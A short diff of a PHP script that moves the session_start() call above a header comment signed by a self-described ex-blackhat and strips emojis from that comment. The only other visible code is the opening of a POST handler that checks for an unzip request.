@@ -1,7 +1,9 @@
 <?php
+session_start();
+
 /*
-Graybyt3 - Ex-Blackhat 🖤 | Ex Super Mod of Team_CC.
-Now securing systems as a Senior Security Expert 🛡️.
+Graybyt3 - Ex-Blackhat | Ex Super Mod of Team_CC.
+Now securing systems as a Senior Security Expert.
 I hack servers for fun, patch them to torture you.
 
 "My life is a lie, and i'm living in this only truth.- Graybyt3"
@@ -12,7 +14,6 @@ I am not responsible for any misuse or illegal activities.
 WARNING: Steal my code, and I'll call you Pappu — there's no worse shame in this world than being called Pappu.
 #FuCk_Pappu
 */
-session_start();
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['dounzip'])) {
